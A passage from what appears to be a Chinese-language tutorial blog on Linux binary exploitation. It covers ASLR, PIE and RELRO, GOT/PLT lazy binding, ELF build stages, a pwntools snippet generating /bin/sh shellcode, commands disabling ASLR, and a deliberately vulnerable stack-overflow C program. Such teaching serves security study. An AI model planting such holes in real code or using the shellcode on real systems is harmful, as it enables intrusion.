libraries</th></tr></thead><tbody><tr><td>0</td><td>&#10008;</td><td>&#10008;</td><td>&#10008;</td><td>&#10008;</td><td>&#10008;</td></tr><tr><td>1</td><td>&#10008;</td><td>&#10008;</td><td>&#10008;</td><td>&#10004;</td><td>&#10004;</td></tr><tr><td>2</td><td>&#10008;</td><td>&#10008;</td><td>&#10004;</td><td>&#10004;</td><td>&#10004;</td></tr><tr><td>2+PIE</td><td>&#10004;</td><td>&#10004;</td><td>&#10004;</td><td>&#10004;</td><td>&#10004;</td></tr></tbody></table><p>使用一个程序来演示下上表的内容</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">stack</span>;</span><br><span class="line"><span class="keyword">int</span> *heap = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"><span class="keyword">void</span> *handle = dlopen(<span class="string">&quot;libc.so.6&quot;</span>, RTLD_NOW | RTLD_GLOBAL);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;executable: %p\n&quot;</span>, &amp;main);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;system@plt: %p\n&quot;</span>, &amp;system);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;heap: %p\n&quot;</span>, heap);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;stack: %p\n&quot;</span>, &amp;<span class="built_in">stack</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;libc: %p\n&quot;</span>, handle);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(heap);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc test.c -no-pie -fno-pie -ldl</span></span><br></pre></td></tr></table></figure><h5 id="未开启ASLR和PIE"><a href="#未开启ASLR和PIE" class="headerlink" title="未开启ASLR和PIE"></a>未开启ASLR和PIE</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# .&#x2F;a.out </span><br><span class="line">executable: 0x4011d6</span><br><span class="line">system@plt: 0x4010b0</span><br><span class="line">heap: 0x4052a0</span><br><span class="line">stack: 0x7fffffffe014</span><br><span class="line">libc: 0x7ffff7fb3500</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# .&#x2F;a.out </span><br><span class="line">executable: 0x4011d6</span><br><span class="line">system@plt: 0x4010b0</span><br><span class="line">heap: 0x4052a0</span><br><span class="line">stack: 0x7fffffffe014</span><br><span class="line">libc: 0x7ffff7fb3500</span><br></pre></td></tr></table></figure><p>可以看到所有的地址都不变</p><h5 id="开启ALSR未开启PIE"><a href="#开启ALSR未开启PIE" class="headerlink" title="开启ALSR未开启PIE"></a>开启ALSR未开启PIE</h5><h6 id="部分开启时"><a href="#部分开启时" class="headerlink" title="部分开启时"></a>部分开启时</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# .&#x2F;a.out </span><br><span class="line">executable: 0x4011d6</span><br><span class="line">system@plt: 0x4010b0</span><br><span class="line">heap: 0x4052a0</span><br><span class="line">stack: 0x7ffdde37ce04</span><br><span class="line">libc: 0x7f8ef1525500</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# .&#x2F;a.out </span><br><span class="line">executable: 0x4011d6</span><br><span class="line">system@plt: 0x4010b0</span><br><span class="line">heap: 0x4052a0</span><br><span class="line">stack: 0x7ffcd375c374</span><br><span class="line">libc: 0x7f51c11fb500</span><br></pre></td></tr></table></figure><p>可以看到只有<strong>栈</strong>的地址和<strong>libc</strong>的地址发生了改变</p><h6 id="完全开启时"><a href="#完全开启时" class="headerlink" title="完全开启时"></a>完全开启时</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# echo 2 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# .&#x2F;a.out </span><br><span class="line">executable: 0x4011d6</span><br><span class="line">system@plt: 0x4010b0</span><br><span class="line">heap: 0x15162a0</span><br><span class="line">stack: 0x7ffda4f34384</span><br><span class="line">libc: 0x7f615589b500</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# .&#x2F;a.out </span><br><span class="line">executable: 0x4011d6</span><br><span class="line">system@plt: 0x4010b0</span><br><span class="line">heap: 0x5a22a0</span><br><span class="line">stack: 0x7ffe432fa664</span><br><span class="line">libc: 0x7f17a059f500</span><br></pre></td></tr></table></figure><p>可以看到只有<strong>栈</strong>、<strong>libc</strong>、<strong>堆</strong>的地址发生了改变，但是程序本身的<strong>PLT</strong>不变</p><h5 id="开启ALSR和PIE"><a href="#开启ALSR和PIE" class="headerlink" title="开启ALSR和PIE"></a>开启ALSR和PIE</h5><p>GCC支持的PIE选项如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-fpic          <span class="comment">#为共享库生成位置无关代码</span></span><br><span class="line">-pie           <span class="comment">#生成动态链接的位置无关可执行文件，通常需要同时指定-fpie</span></span><br><span class="line">-no-pie        <span class="comment">#不生成动态链接的位置无关可执行文件</span></span><br><span class="line">-fpie          <span class="comment">#类似于-fpic，但生成的位置无关代码只能用于可执行文件，通常同时指定-pie</span></span><br><span class="line">-fno-pie       <span class="comment">#不生成位置无关代码</span></span><br></pre></td></tr></table></figure><p>通过<code>-pie -fpie</code>进行编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# echo 2 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# gcc -pie -fpie test.c -ldl</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# .&#x2F;a.out </span><br><span class="line">executable: 0x5640b79d01c9</span><br><span class="line">system@plt: 0x7fa5361ca410</span><br><span class="line">heap: 0x5640b8a392a0</span><br><span class="line">stack: 0x7ffc036cac64</span><br><span class="line">libc: 0x7fa53636d500</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# .&#x2F;a.out </span><br><span class="line">executable: 0x561760ad81c9</span><br><span class="line">system@plt: 0x7f509abd0410</span><br><span class="line">heap: 0x561760be32a0</span><br><span class="line">stack: 0x7ffe2f8a7694</span><br><span class="line">libc: 0x7f509ad73500</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# </span><br></pre></td></tr></table></figure><p>可以看到全部地址都随机了</p><hr><h4 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h4><p>在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。 所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处.</p><p>GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术: read only relocation。大概实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读.</p><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p><p>gcc编译：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c            <span class="comment">#默认情况下，是Partial RELRO</span></span><br><span class="line">gcc -z norelro -o <span class="built_in">test</span> test.c <span class="comment">#关闭，即No RELRO</span></span><br><span class="line">gcc -z lazy -o <span class="built_in">test</span> test.c    <span class="comment">#部分开启，即Partial RELRO</span></span><br><span class="line">gcc -z now -o <span class="built_in">test</span> test.c     <span class="comment">#全部开启</span></span><br></pre></td></tr></table></figure><hr><blockquote><h3 id="常见概念"><a href="#常见概念" class="headerlink" title="常见概念"></a>常见概念</h3></blockquote><h4 id="GOT"><a href="#GOT" class="headerlink" title="GOT"></a>GOT</h4><p>GOT（Global Offset Table，全局偏移表）是Linux ELF文件中用于定位全局变量和函数的一个表。</p><hr><h4 id="PLT"><a href="#PLT" class="headerlink" title="PLT"></a>PLT</h4><p>PLT（Procedure Linkage Table，过程链接表）是Linux ELF文件中用于延迟绑定的表，即函数第一次被调用的时候才进行绑定。</p><h5 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h5><p>所谓延迟绑定，就是当函数第一次被调用的时候才进行绑定（包括符号查找、重定位等），如果函数从来没有用到过就不进行绑定。基于延迟绑定可以大大加快程序的启动速度，特别有利于一些引用了大量函数的程序</p><hr><h4 id="GOT和PLT的关系"><a href="#GOT和PLT的关系" class="headerlink" title="GOT和PLT的关系"></a>GOT和PLT的关系</h4><p>ELF使用PLT（Procedure linkage Table, 过程链接表)的方法来实现。通常我们调用某个外部模块的函数时，应该是通过GOT中相应的项进行间接跳转。而PLT为了实现延迟绑定，在这个过程中有增加了一层间接跳转。调用函数并不直接通过GOT跳转，而是通过一个叫作PLT项的结构来进行跳转。每个外部函数在PLT中都有一个相应的项，比如<code>gets()</code>(<strong>在string头文件的函数，不是用户自定义的函数</strong>)在PLT中的项的地址我们称为<code>gets@plt</code>。其中<code>gets@plt</code>的实现如下：</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/3.png?raw=true" alt="image-20201116153715662"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#在gets第一次使用的时候，会做以下操作，如果不是第一次就直接jmp *(gets@GOT)就能获取到函数的真实地址</span><br><span class="line">gets@plt:</span><br><span class="line">    jmp *(gets@GOT)</span><br><span class="line">    push n</span><br><span class="line">    jump _dl_runtime_resolve</span><br></pre></td></tr></table></figure><ul><li>第一条指令是通过一条GOT间接跳转的指令。jmp指令跳转到GOT表，数据为0x400486</li><li>第二条指令执行<code>push 0x3</code>，这个为在GOT中的下标序号。</li><li>第三条指令<code>jmp 0x400440</code>，这个地址为PLT[0]的地址，PLT[0]的指令会进入动态链接器的入口，执行一个函数(<strong>_dl_runtime_resolve</strong>)将真正的函数地址填入到GOT表中</li></ul><p>再次调用<code>gets@plt</code>时，第一条jump指令能跳转到真正的gets()函数中，gets()函数返回的时候会根据堆栈里保存的EIP直接返回到调用者，而不会在继续执行<code>gets@plt</code>中第二条指令开始的那段代码。因为GOT表中已经有真正的函数地址，逻辑和下图类似</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/4.png?raw=true" alt="image-20201116161136273"></p><hr><blockquote><h3 id="文件格式"><a href="#文件格式" class="headerlink" title="文件格式"></a>文件格式</h3></blockquote><h4 id="可重定位目标文件-Relocatable-File）"><a href="#可重定位目标文件-Relocatable-File）" class="headerlink" title="可重定位目标文件 (Relocatable File）"></a>可重定位目标文件 (Relocatable File）</h4><p><strong>Linux</strong>下的.o（<strong>Windows</strong>下的.obj）包含代码和数据，可被用来链接成可执行文件或共享目标文件，静态链接库也可以归为这一类 </p><p>每个.o 文件由对应的.c文件生成 每个.o文件代码和数据地址都从0开始</p><hr><h4 id="可执行目标文件-Executable-File"><a href="#可执行目标文件-Executable-File" class="headerlink" title="可执行目标文件(Executable File)"></a>可执行目标文件(Executable File)</h4><p>包含的代码和数据可以被直接复制到内存并被执行</p><p><strong>Linux</strong>下的无文件后缀（<strong>Windows</strong>下的.exe）</p><hr><h4 id="共享的目标文件-Shared-Object-File"><a href="#共享的目标文件-Shared-Object-File" class="headerlink" title="共享的目标文件 (Shared Object File)"></a>共享的目标文件 (Shared Object File)</h4><p>链接器可使用.so文件跟其他.o文件和.so文件链接以生成新的.o文件</p><p>动态链接器将几个.so文件与可执行文件结合，作为进程映像的一部分来运行 特殊的可重定位目标文件，能在装入或运行时被装入到内存并自动被链接，称为共享库文件</p><p><strong>Windows</strong> 中称其为 <strong>Dynamic</strong> <strong>Link</strong> <strong>Libraries</strong> (<strong>DLLs</strong>)</p><hr><h4 id="常见的文件格式"><a href="#常见的文件格式" class="headerlink" title="常见的文件格式"></a>常见的文件格式</h4><ul><li><p>DOS操作系统（最简单） ：<strong>COM格式</strong>，文件中仅包含代码和数据，且被加载到固定位置</p></li><li><p>UNIX System V早期版本：<strong>COFF格式</strong>，文件中不仅包含代码和数据，还包含重定位信息、调试信息、符号表等其他信息，由一组严格定义的数据结构序列组成</p></li><li><p>Windows： <strong>PE格式（COFF的变种）</strong>，称为可移植可执行（Portable Executable，简称PE）</p><p>详解请看这篇文章<a href="https://www.ascotbe.com/2020/03/23/PortableExecutable/">PE格式详解</a></p></li><li><p>Linux：<strong>ELF格式（COFF的变种）</strong>，称为可执行可链接（Executable and Linkable Format，简称ELF）</p><p>详解请看这篇文章<a href="https://www.ascotbe.com/2020/12/6/ExecutableLinkableFormat/">ELF格式详解</a></p></li></ul><hr><blockquote><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3></blockquote><h4 id="ELF文件生成"><a href="#ELF文件生成" class="headerlink" title="ELF文件生成"></a>ELF文件生成</h4><p>首先来看一个代码文件生成过程，下面过程也可以直接从原始C文件链路到任意过程，一下步骤只是一个拆分过程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello World!n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="预处理过程"><a href="#预处理过程" class="headerlink" title="预处理过程"></a>预处理过程</h5><p>主要处理源文件中以“#”开头的预编译指令，经过预编译处理后，得到的是预处理文件（如，hello.i) ，它还是一个可读的文本文件 。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc –E hello.c –o hello.i</span><br></pre></td></tr></table></figure><hr><h5 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a>编译过程</h5><p>将预处理后得到的预处理文件（如 hello.i）进行词法分析、语法分析、语义分析、优化后，生成汇编代码文件。经过编译后，得到的汇编代码文件（如 hello.s）还是可读的文本文件，CPU无法理解和执行它。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -S hello.i -o hello.s</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/5.png?raw=true" alt="image-20201116113805853"></p><hr><h5 id="汇编过程"><a href="#汇编过程" class="headerlink" title="汇编过程"></a>汇编过程</h5><p>汇编程序（汇编器）用来将汇编语言源程序转换为机器指令序列（机器语言程序）。汇编结果是一个可重定位目标文件（如 hello.o），其中包含的是不可读的二进制代码，必须用相应的工具软件来查看其内容。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c hello.s -o hello.o</span><br></pre></td></tr></table></figure><p>预处理、编译和汇编三个过程针对一个模块（一个*.c文件）进行处理，得到对应的一个可重定位目标文件（一个*.o文件）。</p><p>用IDA打开</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/6.png?raw=true" alt="image-20201116114352893"></p><hr><h5 id="链接过程"><a href="#链接过程" class="headerlink" title="链接过程"></a>链接过程</h5><p>将多个可重定位目标文件合并以生成可执行目标文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc  hello.o -o hello</span><br></pre></td></tr></table></figure><p>用IDA打开编译好可以执行的文件</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/7.png?raw=true" alt="image-20201116114653378"></p><hr><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>拿到一个文件后首先第一步就是看保护，通过保护来查看使用什么思路</p><ul><li>RELRO： got表的保护，如果开了的话，无法写got表，没开考虑got表</li><li>Canary: 栈溢出保护，开了的话，想办法利用bypass canary绕过，没开直接ROP</li><li>NX: 开了的话，利用ROP技术绕过，没开的话，考虑执行shellcode</li><li>PIE： 开了的话就用bypass pie技术绕过， 没开的话，地址是固定的，考虑一下是否存在后门函数，查看是否有/bin/sh以及system函数</li></ul><hr><blockquote><h3 id="快速获取恶意汇编"><a href="#快速获取恶意汇编" class="headerlink" title="快速获取恶意汇编"></a>快速获取恶意汇编</h3></blockquote><p>使用Python中的pwntools包可以生成对应的架构的shellcode代码，直接使用链式调用的方法就可以得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> shellcraft.i386.nop().strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    nop</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> shellcraft.i386.linux.sh()</span><br><span class="line">    <span class="comment"># push &#x27;/bin///sh\x00&#x27;</span></span><br><span class="line">    push <span class="number">0x68</span></span><br><span class="line">    push <span class="number">0x732f2f2f</span></span><br><span class="line">    push <span class="number">0x6e69622f</span></span><br></pre></td></tr></table></figure><p>果需要在64位的Linux上执行<code>/bin/sh</code>就可以使用<code>shellcraft.amd64.linux.sh()</code>，配合asm函数就能够得到最终的payload了。</p><p>除了直接执行sh之外，还可以进行其它的一些常用操作例如提权、反向连接等等</p><blockquote><h3 id="基础栈溢出"><a href="#基础栈溢出" class="headerlink" title="基础栈溢出"></a>基础栈溢出</h3></blockquote><h4 id="缓冲区溢出原理"><a href="#缓冲区溢出原理" class="headerlink" title="缓冲区溢出原理"></a>缓冲区溢出原理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Stackframe</span><br><span class="line">+------------------+</span><br><span class="line">|    parameter     |</span><br><span class="line">+------------------+</span><br><span class="line">|   local var1     |  &lt;- 4 byte</span><br><span class="line">+------------------+</span><br><span class="line">|   local var2     |  &lt;- 8 byte</span><br><span class="line">+------------------+</span><br><span class="line">|        ebp       |</span><br><span class="line">+------------------+</span><br><span class="line">|    return addr   |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><p>这个函数有一个参数和两个局部变量。局部变量会放在函数的栈帧上，而且这个栈帧的大小是编译时就确定好的。可以看出局部变量1、局部变量2大小都是4字节，局部变量1在4字节的位置上，局部变量2在8字节上的位置上。ebp和return addr是用来保存栈帧基址和函数的返回地址的，对程序员透明。如果给局部变量2输入16个字节，那么就会吧return addr和ebp都给覆盖了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Stackframe</span><br><span class="line">+------------------+                   溢出本质其实就是把ret地址换成</span><br><span class="line">|    parameter     |                 指向shellcode的开头的地址</span><br><span class="line">+------------------+</span><br><span class="line">|       abcd       |  &lt;- local var1</span><br><span class="line">+------------------+</span><br><span class="line">|       aaaa       |  &lt;- local var2</span><br><span class="line">+------------------+</span><br><span class="line">|       aaaa       |  &lt;- ebp</span><br><span class="line">+------------------+</span><br><span class="line">|       aaaa       |  &lt;- return addr</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><hr><h4 id="无保护溢出"><a href="#无保护溢出" class="headerlink" title="无保护溢出"></a>无保护溢出</h4><p>比较常见的程序流劫持就是栈溢出，格式化字符串攻击和堆溢出了。通过程序流劫持，攻击者可以控制PC指针从而执行目标代码。为了应对这种攻击，系统防御者也提出了各种防御方法，最常见的方法有DEP（堆栈不可执行），ASLR（内存地址随机化），Stack Protector（栈保护）等。</p><h5 id="编译代码"><a href="#编译代码" class="headerlink" title="编译代码"></a>编译代码</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    vulnerable_function();</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译上述代码</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -z execstack -no-pie level1.c -o level1 </span><br></pre></td></tr></table></figure><p>接着查看程序保护是否关闭了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@ascotbe:~<span class="comment"># checksec level1</span></span><br><span class="line">[*] <span class="string">&#x27;/ctf/work/level1&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>接着关闭Linux系统的ASLR保护</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#非docker容器关闭</span></span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">sysctl -w kernel.randomize_va_space=0</span><br><span class="line"><span class="comment">#docker容器只能在GDB场景下关闭</span></span><br><span class="line"><span class="built_in">set</span> disable-randomization on<span class="comment">#关闭ASLR</span></span><br><span class="line"><span class="built_in">set</span> disable-randomization off <span class="comment">#开启ASLR</span></span><br><span class="line">show disable-randomization<span class="comment">#查看ASLR状态</span></span><br></pre></td></tr></table></figure><p>如果输入<code>cat /proc/sys/kernel/randomize_va_space</code>若返回为0的话表示已经关闭了</p><ul><li>0 = 关闭</li><li>1 = 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。</li><li>2 = 全随机。除了1中所述，还有heap。</li></ul><p>也可以使用ldd通过看加载动态库时动态库的基址来确定是否开启ASLR，如果开启是下面这样的，未开启是值不变的</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@ascotbe:~<span class="comment"># ldd level1</span></span><br><span class="line">linux-gate.so.1 (0xf7ed1000)</span><br><span class="line">libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7cd5000)</span><br><span class="line">/lib/ld-linux.so.2 (0xf7ed2000)</span><br><span class="line">root@ascotbe:~<span class="comment"># ldd level1</span></span><br><span class="line">linux-gate.so.1 (0xf7f8f000)</span><br><span class="line">libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d93000)</span><br><span class="line">/lib/ld-linux.so.2 (0xf7f90000)</span><br></pre></td></tr></table></figure><p>在没有任何保护的情况下，我们的利用思路只需要确定字符串大小、返回地址、还有shellcode，然后拼接起来即可，拼接的原理有两种方法</p><ul><li>方法1：把shellcode写在函数的栈帧里, 但其大小有限</li><li>方法2：把shellcode写在调用者(main)的栈帧里</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">方法1：                               方法2：</span><br><span class="line">     Stack                                   Stack</span><br><span class="line">+------------------+       低地址          +------------------+ </span><br><span class="line">|    shellcode     |         ^            | &quot;AAAAAAAAAAAAAA&quot; |</span><br><span class="line">+------------------+         |            +------------------+ </span><br><span class="line">| &quot;AAAAAAAAAAAAAA&quot; |         |            |       ret        |</span><br><span class="line">+------------------+         |            +------------------+ 